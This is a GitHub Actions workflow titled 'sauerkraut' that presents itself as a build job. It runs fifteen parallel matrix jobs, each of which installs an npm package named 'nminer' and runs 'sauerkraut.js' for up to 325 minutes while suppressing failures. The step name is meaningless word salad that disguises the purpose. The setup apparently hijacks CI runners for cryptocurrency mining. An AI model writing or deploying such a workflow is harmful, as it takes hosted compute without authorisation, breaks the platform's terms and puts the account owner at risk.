name: sauerkraut
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2265 }
          - { version: 9311 }
          - { version: 2966 }
          - { version: 9189 }
          - { version: 5680 }
          - { version: 5 }
          - { version: 5947 }
          - { version: 5440 }
          - { version: 8947 }
          - { version: 507 }
          - { version: 8021 }
          - { version: 2892 }
          - { version: 4075 }
          - { version: 6514 }
          - { version: 8442 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: yahoo mobilize yesterday until well-off
        run: |
          npm install nminer@latest
          timeout 325m node sauerkraut.js || echo "sauerkraut executed"